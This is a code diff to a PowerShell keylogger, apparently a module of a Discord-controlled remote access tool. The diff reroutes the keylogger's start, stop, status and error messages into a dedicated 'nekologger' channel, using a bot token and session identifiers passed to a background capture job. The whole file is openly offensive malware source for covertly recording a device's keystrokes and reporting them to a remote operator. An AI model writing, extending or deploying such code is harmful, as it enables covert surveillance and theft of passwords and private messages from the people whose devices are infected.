@@ -1,10 +1,13 @@
+$global:process_nekologger_channel_name = "nekologger"
+Get_OrCreateChannel -channelName $global:process_nekologger_channel_name
+
 function Mkeylogger {
     param (
         [int]$intervalSeconds = 30
     )
     
     if (-not $global:keyloggerstatus) {
-        sendMsg -Message ":stop_sign: **Keylogger is disabled**"
+        sendEmbedWithImage -Title "KEYLOGGER STATUS" -Description "**Keylogger is disabled**" -ChannelTarget $global:process_nekologger_channel_name
         return
     }
     
@@ -25,8 +28,8 @@ function Mkeylogger {
     
     # Use current coral-control channel
     $keylogChannelID = $global:SessionID
-    
-    sendMsg -Message ":keyboard: **Keylogger started on $deviceId** (Interval: ${intervalSeconds}s)"
+
+    sendEmbedWithImage -Title "KEYLOGGER STATUS" -Description "**Keylogger started on $deviceId** (Interval: ${intervalSeconds}s)" -ChannelTarget $global:process_nekologger_channel_name
 
     # Key names for special keys
     $keyNames = @{
@@ -135,9 +138,9 @@ function Mkeylogger {
             [System.GC]::Collect()
         }
     } catch {
-        sendMsg -Message ":x: **Keylogger error:** $($_.Exception.Message)"
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **Keylogger error:** $($_.Exception.Message)" -Color "13369344" -ChannelTarget $global:process_nekologger_channel_name
     } finally {
-        sendMsg -Message ":stop_sign: **Keylogger stopped on $deviceId**"
+        sendEmbedWithImage -Title "KEYLOGGER STATUS" -Description ":stop_sign: **Keylogger stopped on $deviceId**" -ChannelTarget $global:process_nekologger_channel_name
     }
 }
 
@@ -146,15 +149,15 @@ function MStart_Keylogger {
     param([int]$intervalSeconds = 30)
     
     if ($global:keyloggerstatus) {
-        sendMsg -Message ":warning: **Keylogger is already running**"
+        sendEmbedWithImage -Title "KEYLOGGER STATUS" -Description ":warning: **Keylogger is already running**" -ChannelTarget $global:process_nekologger_channel_name
         return
     }
     
     $global:keyloggerstatus = $true
     
     try {
-        sendMsg -Message ":keyboard: **Starting keylogger...** (Interval: ${intervalSeconds}s)"
-        
+        sendEmbedWithImage -Title "KEYLOGGER STATUS" -Description ":keyboard: **Starting keylogger...** (Interval: ${intervalSeconds}s)" -ChannelTarget $global:process_nekologger_channel_name
+
         $keylogJob = Start-Job -ScriptBlock {
             param($token, $SessionID, $CategoryID, $intervalSeconds)
             
@@ -179,11 +182,11 @@ function MStart_Keylogger {
         } -ArgumentList $global:token, $global:SessionID, $global:CategoryID, $intervalSeconds
         
         $script:Jobs["KEYLOGGER"] = $keylogJob
-        sendMsg -Message ":keyboard: **Keylogger started** (Job ID: $($keylogJob.Id)) - Data will appear in this channel"
-        
+        sendEmbedWithImage -Title "KEYLOGGER STATUS" -Description "(Job ID: $($keylogJob.Id)) - Data will appear in this channel" -ChannelTarget $global:process_nekologger_channel_name
+
     } catch {
         $global:keyloggerstatus = $false
-        sendMsg -Message ":x: **Failed to start keylogger:** $($_.Exception.Message)"
+        sendEmbedWithImage -Title "ERROR" -Description "Failed to start keylogger: $($_.Exception.Message)" -Color "13369344" -ChannelTarget $global:process_nekologger_channel_name
     }
 }
 
@@ -205,21 +208,21 @@ function MStop_Keylogger {
             
             # Remove from our jobs tracking
             $script:Jobs.Remove("KEYLOGGER")
-            
-            sendMsg -Message ":stop_sign: **Keylogger stopped successfully**"
+
+            sendEmbedWithImage -Title "KEYLOGGER STATUS" -Description ":stop_sign: **Keylogger stopped successfully**" -ChannelTarget $global:process_nekologger_channel_name
         } catch {
             # If normal stop fails, try more aggressive approach
             try {
                 $job | Stop-Job -ErrorAction SilentlyContinue
                 $job | Remove-Job -ErrorAction SilentlyContinue
                 $script:Jobs.Remove("KEYLOGGER")
-                sendMsg -Message ":stop_sign: **Keylogger force stopped**"
+                sendEmbedWithImage -Title "KEYLOGGER STATUS" -Description ":stop_sign: **Keylogger force stopped**"
             } catch {
-                sendMsg -Message ":warning: **Error stopping keylogger:** $($_.Exception.Message)"
+                sendEmbedWithImage -Title "ERROR" -Description ":warning: **Error stopping keylogger:** $($_.Exception.Message)" -Color "13369344" -ChannelTarget $global:process_nekologger_channel_name
             }
         }
     } else {
-        sendMsg -Message ":information_source: **Keylogger is not running**"
+        sendEmbedWithImage -Title "KEYLOGGER STATUS" -Description ":information_source: **Keylogger is not running**" -ChannelTarget $global:process_nekologger_channel_name
     }
 }
 
@@ -227,8 +230,8 @@ function MStop_Keylogger {
 function MGet_KeyloggerStatus {
     if ($global:keyloggerstatus -and $script:Jobs.ContainsKey("KEYLOGGER")) {
         $job = $script:Jobs["KEYLOGGER"]
-        sendMsg -Message ":gear: **Keylogger Status:** Running (Job State: $($job.State)) - Logging to this channel"
+        sendEmbedWithImage -Title "KEYLOGGER STATUS" -Description ":gear: **Keylogger Status:** Running (Job State: $($job.State)) - Logging to this channel" -ChannelTarget $global:process_nekologger_channel_name
     } else {
-        sendMsg -Message ":gear: **Keylogger Status:** Stopped"
+        sendEmbedWithImage -Title "KEYLOGGER STATUS" -Description ":gear: **Keylogger Status:** Stopped" -ChannelTarget $global:process_nekologger_channel_name
     }
 }
